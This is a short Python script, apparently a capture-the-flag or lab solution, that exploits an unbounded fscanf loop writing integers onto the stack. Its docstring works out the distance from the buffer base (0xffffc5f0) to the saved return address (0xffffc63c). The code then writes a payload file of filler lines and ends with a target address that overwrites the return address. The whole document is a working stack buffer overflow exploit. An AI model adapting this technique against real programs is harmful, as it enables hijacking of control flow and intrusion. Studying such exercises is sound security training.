'''
return address locate at 0xffffc63c
base address : 0xffffc5f0

When fscanf execute once, value at 0x804a000+0x44 will be add one
'shl eax, 0x2' is equivalent to 'eax = eax * 4'

the program is something like:
    int offset;
    storeAddress = 0xffffc5f0
    while(fscanf(stream, "%d", storeAddress + offset * 4))
    {
        ++offset;
    }

We need to produce a file that have (0xffffc63c - 0xffffc5f0) / 4 lines
and put the address we want to jump to at the ((0xffffc63c - 0xffffc5f0) / 4 + 1)th line 
'''

f = open('payload', 'w')

address = str(int(0x08048626))
lines = (0xffffc63c - 0xffffc5f0) / 4

while lines > 0:
    f.write('1\n')
    lines -= 1

f.write(address + '\n')
